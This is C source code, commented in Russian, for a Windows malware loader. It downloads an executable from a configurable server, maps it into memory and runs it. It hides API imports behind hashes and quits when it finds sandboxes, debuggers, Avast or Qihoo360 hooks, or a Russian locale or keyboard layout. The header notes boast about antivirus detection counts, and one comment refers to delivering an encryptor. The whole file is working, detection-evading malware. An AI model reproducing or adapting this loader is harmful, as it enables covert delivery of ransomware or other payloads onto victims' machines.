/*
http://viruscheckmate.com/id/GSpTbAuQz1sT
https://dyncheck.com/scan/id/97b12ba11a96fafaac43eb6afc59c796
Комодо ебанулся - здесь к реестру не лезет абсолютно ничего)
Пришлось избежать динамического импорта, чтобы сделать норм таблицу импортов и уменьшить детекты.
ВАЖНО: компилировать нужно именно с моими настройками, т.к. к примеру добавление секции манифеста = + детект от аваста, уберёшь
debug инфу - будет так: http://viruscheckmate.com/id/0QACb0wO6QiU
Сам лоадер основан на loadpe, его я тоже подробно объяснил в коде, поэтому глупые детекты если и появятся, то не скоро
(это вроде мало где используют, все крипторы и лоадеры в основном на runpe aka process hollowing ).
*/

#include <Windows.h>
#include <WinInet.h>
#include "hashes.h"
#include "structs.h"
#include <Psapi.h>
#pragma comment(linker, "/SUBSYSTEM:CONSOLE /ENTRY:Entry")
#define RUSSIAN_LANG_CODE 1049
#define MAX_FILE_SIZE 31457280 // Максимальный размер образа для скачивания = 30 мб (указано в байтах)

#define SERVER "SERVER" // сервер вида www.server.com
#define FILE_PATH "" // путь к файлу вида: /file.exe

/* Здесь не использовал tls, так как коллбек прибавит 2-3 детекта, не нравится аверам такое, т.к. приём был давно замечен в анти-отладке.
#ifdef _M_IX86
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_p_tls_callback1")
#pragma data_seg(".CRT$XLB")
EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback1 = main_tls;
#pragma data_seg()
#endif
*/

HINTERNET(__stdcall* pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
HINTERNET(__stdcall* pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
HINTERNET(__stdcall* pHttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
int(__stdcall* pHttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
int(__stdcall* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
int(__stdcall* pInternetCloseHandle)(HINTERNET);

void pExitProcess(UINT exitCode)
{
	TerminateProcess(GetCurrentProcess(), exitCode);
}

void m_memcpy(void* dest_void, void* src_void, int size)
{
	BYTE* dest = (BYTE*)dest_void;
	BYTE* src = (BYTE*)src_void;
	while (size--)
		*dest++ = *src++;
}


DWORD hash_func(char* str)
{
	/* https://en.wikipedia.org/wiki/PJW_hash_function */
	unsigned long h = 0, high;
	while (*str)
	{
		h = (h << 4) + *str++;
		if (high = h & 0xF0000000)
			h ^= high >> 24;
		h &= ~high;
	}
	return h;
}

HMODULE get_module_handle(DWORD dwHash)
{
	_LDR_MODULE* pModule = nullptr;
	_asm
	{
		mov eax, fs:[0x30] // PEB
		mov eax, [eax+0xC] // pModule
		mov eax, [eax+0xC] // pModule->InLoadOrderModuleList.Flink
		mov pModule, eax
	}
	// Сейчас в pModule находится модуль нашего файла
	while (pModule->BaseAddress) // проходимся по всем dll
	{
		/*
		переводим имя dll в ansi-строку и приводим всё к верхнему регистру, чтобы не возникло таких проблем, что
		dll песочницы загружена, но не нашлась
		*/
		char dll_name[260];
		WideCharToMultiByte(CP_ACP, 0, pModule->BaseDllName.Buffer, -1, dll_name, 260, 0, 0);
		for (int i = 0; dll_name[i] != 0; ++i) /* привести все буквы к верхнему регистру */
			if (dll_name[i] > 96 && dll_name[i] < 123)
				dll_name[i] -= 32;
		if (hash_func(dll_name) == dwHash) // сравниваем хеш
			return (HMODULE)pModule->BaseAddress; // возвращаем базовый адрес
		pModule = (LDR_MODULE*)pModule->InLoadOrderModuleList.Flink; // переходим к следующему модулю в списке
	}
	return nullptr;
}

DWORD get_proc_address(BYTE* pDLL, DWORD dwAPI)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pDLL;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDLL + pDos->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)(pDLL + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD dwNames = (PDWORD)(pDLL + pIED->AddressOfNames);
	PDWORD dwFunctions = (PDWORD)(pDLL + pIED->AddressOfFunctions);
	PWORD wNameOrdinals = (PWORD)(pDLL + pIED->AddressOfNameOrdinals);
	for (DWORD i = 0; i < pIED->NumberOfNames; i++)
		if (hash_func((char*)(pDLL + dwNames[i])) == dwAPI)
			return (DWORD_PTR)(pDLL + dwFunctions[wNameOrdinals[i]]);
	return 0;
}

void init_api()
{
	BYTE* wininet = (BYTE*)LoadLibraryA("wininet");
	*(DWORD*)&pInternetOpenA = get_proc_address(wininet, dwInternetOpenA);
	*(DWORD*)&pInternetConnectA = get_proc_address(wininet, dwInternetConnectA);
	*(DWORD*)&pHttpOpenRequestA = get_proc_address(wininet, dwHttpOpenRequestA);
	*(DWORD*)&pHttpSendRequestA = get_proc_address(wininet, dwHttpSendRequestA);
	*(DWORD*)&pInternetReadFile = get_proc_address(wininet, dwInternetReadFile);
	*(DWORD*)&pInternetCloseHandle = get_proc_address(wininet, dwInternetCloseHandle);
}

DWORD pGetLastError()
{
	// https://www.nirsoft.net/kernel_struct/vista/TEB.html
	__asm
	{
		mov eax, fs:[0x18] // teb
		mov eax, [eax+0x34] // teb.LastErrorValue
	}
}

// Скачивает файл по ссылке. Максимальный размер - MAX_FILE_SIZE. Сервер - SERVER, путь к файлу - FILE_PATH.
LPVOID download_file()
{
	HINTERNET hInternet, hConnect, hRequest;
	DWORD sent;
	if (!(hInternet = pInternetOpenA(0, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0)))
		return nullptr;
	if (!(hConnect = pInternetConnectA(hInternet, SERVER, INTERNET_DEFAULT_HTTPS_PORT, 0, 0, INTERNET_SERVICE_HTTP, 0, 0)))
		return nullptr;
	if (!(hRequest = pHttpOpenRequestA(hConnect, 0, FILE_PATH, 0, 0, 0, INTERNET_FLAG_SECURE, 0)))
		return nullptr;
	if (!pHttpSendRequestA(hRequest, 0, 0, 0, 0))
		return nullptr;
	void* pe = (char*)GlobalAlloc(GMEM_FIXED, MAX_FILE_SIZE); // 30 mb
	if (!pInternetReadFile(hRequest, pe, MAX_FILE_SIZE, &sent))
	{
		GlobalFree(pe);
		return NULL;
	}
	pInternetCloseHandle(hRequest);
	pInternetCloseHandle(hConnect);
	pInternetCloseHandle(hInternet);
	return pe;
}

void *load_pe(void *pData)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pData;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD)pData + pDos->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOpt = &pNt->OptionalHeader;
	PIMAGE_DATA_DIRECTORY reloc_entry = &pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	/* Мы не можем пофиксить релоки некоторых файлов, хз почему такое бывает. */
	if (!reloc_entry->VirtualAddress)
		return NULL;
	// Решил даже не пробовать выделить память по предпочитаемому адресу загрузки PE (0x400000).
	LPVOID pBase = VirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pBase)
		return NULL;
	PBYTE pByte = (PBYTE)pBase;
	WORD nsections = pNt->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(pNt);
	// вычисляем размер заголовков (отнимаем от начала секций базовый адрес образа)
	size_t hdrs_size = (byte*)(sections + nsections) - (byte*)pData;
	// копируем все заголовки
	m_memcpy(pBase, pData, hdrs_size);
	/* Копируем секции относительно базового адреса выделенной памяти */
	for (WORD i = 0; i < nsections; ++i)
		m_memcpy(pByte + sections[i].VirtualAddress, (byte*)pData + sections[i].PointerToRawData, sections[i].SizeOfRawData);
	/* Подгружаем длл из таблицы импортов */
	if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
	{
		PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pByte + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		while (pImport->Name)
		{
			/* Проходимся по всем длл и загружаем их */
			char* szMod = (char*)(pByte + pImport->Name);
			HINSTANCE hDll = LoadLibraryA(szMod);
			/* Указатель на имя или ординал (номер, по которому тоже может быть произведён импорт функции, не одинаковый на разных ос и даже x86, x64 длл
			могут иметь разный, но может быть одинаков у некоторых функций из системных длл) функции.*/
			PDWORD pThunk = (PDWORD)(pByte + pImport->OriginalFirstThunk);
			/* Указатель на адрес функции */
			PDWORD pFunc = (PDWORD)(pByte + pImport->FirstThunk);
			if (pThunk == NULL)
				pThunk = pFunc;
			for (; *pThunk; ++pThunk, ++pFunc)
				// Проходимся по всем функциям и получаем их адреса.
				if (IMAGE_SNAP_BY_ORDINAL(*pThunk))
					*pFunc = (ULONG)GetProcAddress(hDll, MAKEINTRESOURCE(*pThunk));
				else
					*pFunc = (ULONG)GetProcAddress(hDll, (LPSTR)((PIMAGE_IMPORT_BY_NAME)(pByte + (*pThunk)))->Name);
			++pImport;
		}
	}
	/* Фиксим релоки */
	PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pByte + reloc_entry->VirtualAddress);
	DWORD delta = (DWORD)(pByte - pOpt->ImageBase);
	PIMAGE_BASE_RELOCATION reloc_end = (PIMAGE_BASE_RELOCATION)((DWORD)pReloc + reloc_entry->Size);
	while (pReloc < reloc_end && pReloc->VirtualAddress) {
		int count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		LPWORD pCurRel = (LPWORD)(pReloc + 1);
		void *page_va = pByte + pReloc->VirtualAddress;
		while (count--)
		{
			/* Проверка: является ли релок валидным x86 релоком */
			if ((*pCurRel >> 12) == IMAGE_REL_BASED_HIGHLOW)
				*(PDWORD)((char*)page_va + (*pCurRel & 0x0fff)) += delta;
			++pCurRel; // Переходим к следующему релоку
		}
		pReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pReloc + pReloc->SizeOfBlock);
	}
	/* Вызываем TLS-коллбеки, т.к. наш шифровальщик использует 1-коллбек. */
	if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
	{
		PIMAGE_TLS_DIRECTORY pTls = (PIMAGE_TLS_DIRECTORY)(pByte + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
		PIMAGE_TLS_CALLBACK* pCallback = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks; // получаем адрес на начало массива коллбеков
		for (; pCallback && *pCallback; ++pCallback) // проходимся по каждому коллбеку
			(*pCallback)(pBase, DLL_PROCESS_ATTACH, 0); // вызываем его
	}
	return (pByte + pOpt->AddressOfEntryPoint); // возвращаем точку входа
}

/*
Добавил для себя, можно таким образом avast искать в памяти, мб потом сделаю
char *avastSignatures[] = { "A.v.a.s.t", "s.n.x.h.k" };
bool avastSandbox = SearchForSignatureInMemory(avastSignatures);
bool SearchForSignatureInMemory(char* signature[])
{
	HANDLE processHandle = GetCurrentProcess();
	if (processHandle)
	{
		SYSTEM_INFO sys_info;
		GetSystemInfo(&sys_info);
		LPVOID proc_min_address = sys_info.lpMinimumApplicationAddress;
		LPVOID proc_max_address = sys_info.lpMaximumApplicationAddress;
		DWORD proc_min_address_d = (DWORD)proc_min_address;
		DWORD proc_max_address_d = (DWORD)proc_max_address;
		MEMORY_BASIC_INFORMATION memInfo;
		unsigned char *p = NULL;
		for (p = NULL; VirtualQueryEx(processHandle, p, &memInfo, sizeof(memInfo)) == sizeof(memInfo); p += memInfo.RegionSize)
		{
			std::vector<char> buffer;
			std::vector<char>::iterator pos;

			if (memInfo.State == MEM_COMMIT)// &&
											//(memInfo.Type == MEM_MAPPED || memInfo.Type == MEM_PRIVATE || memInfo.Type == LMEM_FIXED))
			{
				SIZE_T bytes_read;
				buffer.resize(memInfo.RegionSize);
				ReadProcessMemory(processHandle, p, &buffer[0], memInfo.RegionSize, &bytes_read);
				buffer.resize(bytes_read);
				if (bytes_read <= 0)
					continue;
				bool found = true;
				int arrayLen = (sizeof signature / sizeof signature[0]);
				for (int signCounter = 0; signCounter <= arrayLen; signCounter++)
				{
					for (int bufIndex = 0; bufIndex < buffer.size(); bufIndex++)
					{
						found = true;
						// Search for first character of signature in buffer
						if (buffer[bufIndex] != signature[signCounter][0] || buffer[bufIndex + 1] != signature[signCounter][2])
							continue;
						int tempBuffIndex = bufIndex;
						for (int signChecker = 0; signChecker < strlen(signature[signCounter]); signChecker++)
						{
							if (signature[signCounter][signChecker] == '.')
								continue;
							if (buffer[(tempBuffIndex)] != signature[signCounter][signChecker])
							{
								found = false;
								break;
							}
							tempBuffIndex++;
						}

						if (found)
							return true;
					}
				}
			}
		}
	}
	return false;
}*/

void anti_emul()
{
	// Анти-отладка путём вызова неэмулирующейся функции.
	void* working_set = GlobalAlloc(GMEM_FIXED, 8);
	QueryWorkingSet(GetCurrentProcess(), working_set, 3);
	if (pGetLastError() != ERROR_BAD_LENGTH) // Такая ошибка будет при обычном использовании.
		pExitProcess(0);

	GlobalFree(working_set);
	// Чекаем, подгружены ли длл различных песочниц.
	if (get_module_handle(cmdvrt32)) // Qihoo360
		pExitProcess(0);
	if (get_module_handle(SxIn)) // Sandboxie
		pExitProcess(0);
	if (get_module_handle(Sf2)) // Avast
		pExitProcess(0);
	if (get_module_handle(apimonitor_drv_x64) || get_module_handle(apimonitor_psn_x64))
		pExitProcess(0);
	if (get_module_handle(dwdbghelp)) // подгружается некоторыми отладчиками
		pExitProcess(0);
	__asm
	{
		mov eax, fs:[0x30]
		mov ah, [eax + 0x2]
		test ah, ah
		jz valid
		call pExitProcess
		valid :
	}
	if (GetSystemDefaultLCID() == RUSSIAN_LANG_CODE)
		pExitProcess(0);

	int layout = (int)GetKeyboardLayout(0);
	if (layout == 0x04190419) // русская раскладка клавы
	{
		 pExitProcess(0);
	}
	else if (layout == 0x04090409) // английская раскладка клавы
	{
		 SendMessage(GetForegroundWindow(), WM_INPUTLANGCHANGEREQUEST, 2, 0); // то же самое, что и shift + alt
		 layout = (int)GetKeyboardLayout(0); // получаем текущую раскладку
		 SendMessage(GetForegroundWindow(), WM_INPUTLANGCHANGEREQUEST, 2, 0); // возвращаем язык обратно
		 if (layout == 0x04190419) // ру раскладка?
			  pExitProcess(0);
	}
}

void Entry()
{
	init_api();
	anti_emul();
	LPVOID pBase = download_file();
	if (!pBase)
		pExitProcess(0);
	void* entry_point = load_pe(pBase);
	if (entry_point)
		((void(*)(void))entry_point)();
	pExitProcess(0);
}
